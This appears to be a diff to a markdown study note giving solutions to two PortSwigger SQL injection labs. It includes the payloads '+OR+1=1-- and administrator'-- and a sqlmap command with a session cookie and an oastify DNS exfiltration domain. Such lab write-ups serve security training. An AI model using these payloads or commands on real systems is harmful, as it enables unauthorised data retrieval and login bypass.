@@ -61,23 +61,61 @@ END
 ### 5. Use Web Application Firewalls (WAFs)
 - Tools like **AWS WAF** or **ModSecurity** can block common SQLi patterns.
 
-## Solution to PortSwigger Labs
-### Lab 1: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
-Reference: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 
-Quick Solution
-In this lab the payload is quite easy, the goal is to retrieve hidden items. See next section for the solution.
 
-Solution
-1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Modify the category parameter, giving it the value '+OR+1=1--
-3. Submit the request, and verify that the response now contains additional items.
+# Solution to PortSwigger Labs
 
-Use SQLMap to automate exploitation:
+# SQL Injection Lab 1: Retrieve Hidden Data (WHERE Clause Exploitation)
+
+## Lab Details
+**Lab:** [SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)  
+**Database:** PostgreSQL  
+**Tool:** Burp Suite, SQLMap  
+
+## Quick Solution
+This lab demonstrates a basic SQL injection attack where modifying the `category` parameter allows retrieving hidden items from the database.
+
+## Solution Steps
+### 1. Manual Exploitation (Using Burp Suite)
+1. Use **Burp Suite** to intercept and modify the request that filters products by category.
+2. Modify the `category` parameter with the following payload:
+   ```sql
+   '+OR+1=1--
+   ```
+3. Submit the request and verify that additional hidden items appear in the response.
+
+### 2. Automated Exploitation (Using SQLMap)
+Use `sqlmap` to automate SQL injection detection and exploitation:
 ```sh
 sudo sqlmap -u 'https://0a7600f603ba54f885822399001d0005.web-security-academy.net:443/filter?category=Accessories*' \
---cookie='session=ma2R4BBvX2qlhfa1rxLtomrI2mEf8WtS' --batch --dns-domain=pa3t9ag3m5yqdm6stxugb16nsey5mvak.oastify.com
+--cookie='session=ma2R4BBvX2qlhfa1rxLtomrI2mEf8WtS' --batch \
+--dns-domain=pa3t9ag3m5yqdm6stxugb16nsey5mvak.oastify.com
 ```
+
+## Notes
+- The database management system used in this lab is **PostgreSQL**.
+- SQLMap successfully detects and exploits the vulnerability.
+
+# SQL Injection Lab 2: Login Bypass (Authentication Exploitation)
+
+## Lab Details
+**Lab:** [SQL Injection Vulnerability Allowing Login Bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)  
+**Database:** PostgreSQL  
+**Tool:** Burp Suite, ~~sqlmap~~
+
+## Quick Solution
+This lab demonstrates a basic SQL injection attack where modifying the `username` parameter allows bypassing authentication and logging in as an administrator.
+
+## Solution Steps
+### 1. Manual Exploitation (Using Burp Suite)
+1. Use **Burp Suite** to intercept and modify the login request.
+2. Modify the `username` parameter with the following payload:
+   ```sql
+   administrator'--
+   ```
+3. Submit the request and verify that authentication is bypassed, granting administrator access.
+
+
 
 ## References
 - [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
